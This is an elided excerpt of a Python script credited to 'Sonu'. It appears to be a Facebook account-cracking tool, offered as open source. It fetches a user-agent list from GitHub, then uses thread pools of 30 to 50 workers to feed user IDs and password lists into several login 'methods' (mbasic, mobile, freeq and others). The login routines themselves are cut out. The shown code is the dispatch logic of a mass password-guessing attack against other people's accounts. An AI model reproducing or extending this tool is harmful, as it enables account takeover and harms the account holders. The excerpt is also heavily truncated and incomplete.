...
#open source by Sonu
#github= Sonu-crtr.py
# Aa Gaye Ab  Hum machaynge bhokaal
# india
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/Sonucrtr/Sonu-crtr.py/blob/main/Sonucrtr.py/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("xdg-open https://github.com/Sonu-crtr")
#app  check 
...
def Sonu():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100055205307485")
    else:
...
def Sonu1():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{Sonufire}')
		...
		for guru in user:
			...
			if Sonufire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif Sonufire =='2':yaari.submit(p,uid,pwx,tl)
			elif Sonufire =='3':yaari.submit(x,uid,pwx,tl)
			elif Sonufire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif Sonufire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif Sonufire =='6':yaari.submit(d,uid,pwx,tl)
			else:
...
def Sonu5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if Sonufire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif Sonufire =='2':manshera.submit(p,uid,pwx,tl)
			elif Sonufire =='3':manshera.submit(x,uid,pwx,tl)
			elif Sonufire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif Sonufire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif Sonufire =='6':manshera.submit(d,uid,pwx,tl)
			else:
